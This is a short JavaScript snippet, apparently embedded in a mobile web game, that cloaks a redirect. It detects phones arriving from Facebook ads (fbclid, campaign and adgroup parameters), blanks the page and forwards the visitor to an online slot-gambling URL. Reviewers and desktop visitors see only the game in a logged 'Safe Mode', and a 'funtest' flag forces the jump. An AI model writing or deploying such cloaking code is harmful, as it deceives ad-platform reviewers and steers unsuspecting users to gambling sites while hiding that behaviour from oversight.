(function() {
    // 1. 修复：必须给一个有效的目标地址
    var config_bproducturl = "https://www.goldenslot11.com/13/?p0=1uk61sz6"; 

    function getQueryStr(str) {
        if (!str) return {};
        var obj = {};
        var search = str.split('?')[1];
        if(!search) return {};
        search = search.split('&');
        for (var i = 0; i < search.length; i++) {
            var item = search[i].split('=');
            // 修复：获取值时自动解码并去空格
            obj[item[0]] = decodeURIComponent(item[1] || "").trim();
        }
        return obj;
    }

    var query = getQueryStr(location.search);
    var ua = navigator.userAgent.toLowerCase();

    // 核心判定逻辑
    function shouldJump() {
        // A. 测试模式优先
        if (query.funtest === '1') return true;
        // B. 环境拦截：必须是手机，不能有占位符
        if (!/android|iphone|ipad|ipod/.test(ua)) return false;
        if (location.search.indexOf('{{') > -1 || location.search.indexOf('%7b') > -1) return false;
        // C. 参数拦截：fbclid 和其他参数不能为空或空格
        if (!query.fbclid || !query.campaign || !query.adgroup) return false;
        
        return true;
    }

    if (shouldJump()) {
        // 判定成功：执行零闪烁跳转
        document.body.style.opacity = "0";
        var connector = config_bproducturl.indexOf('?') > -1 ? '&' : '?';
        var finalUrl = config_bproducturl + connector + window.location.search.substring(1);
        
        // 尝试跳转
        window.location.replace(finalUrl);
        
        // 超时恢复，防止白屏
        setTimeout(function() { document.body.style.opacity = "1"; }, 3500);
    } else {
        // 判定失败：正常加载游戏逻辑
        console.log("Safe Mode: Loading game...");
        if (typeof init === 'function') init();
    }
})();
